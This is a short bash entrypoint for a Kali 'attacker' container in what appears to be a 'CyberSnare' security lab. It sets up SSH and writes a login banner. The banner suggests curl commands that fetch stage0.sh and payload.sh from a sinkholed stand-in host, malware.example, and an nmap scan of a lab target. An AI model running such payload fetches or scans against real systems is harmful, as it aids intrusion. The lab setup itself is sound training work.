#!/bin/bash
set -euo pipefail
mkdir -p /run/sshd /home/kali/.ssh
chmod 700 /home/kali/.ssh
chown -R kali:kali /home/kali
cat >/etc/motd <<'EOF'

  CyberSnare attacker (Kali) — lab only
  Target:  10.200.2.10  SSH :2222  HTTPS :8443
  Sinkhole DNS: 10.200.3.2  (malware.example)

  After auto recon→BURN, try:
    curl -v http://malware.example/stage0.sh
    curl -v http://malware.example/payload.sh
    nmap -Pn -p 2222,8443 10.200.2.10

EOF
/usr/sbin/sshd
exec sleep infinity
